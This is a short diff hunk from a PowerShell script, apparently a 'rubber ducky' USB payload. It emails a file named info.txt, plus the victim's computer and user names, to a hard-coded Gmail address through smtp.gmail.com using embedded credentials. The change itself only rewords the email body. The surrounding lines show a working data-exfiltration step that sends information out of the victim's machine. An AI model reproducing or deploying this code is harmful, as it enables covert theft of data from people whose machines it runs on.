@@ -24,7 +24,7 @@ $TO = "patitodegoma404@gmail.com"
 $PC_NAME = "$env:computername"
 $USER_NAME = "$env:UserName"
 $SUBJECT = "El patito de " + $USER_NAME + "@" + $PC_NAME
-$BODY = "Info de " + $PC_NAME + " from " + $USER_NAME + " adjuntada."
+$BODY = "Info del PC " + $PC_NAME + " user: " + $USER_NAME
 $ATTACH = "$p\info.txt"
 
 Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
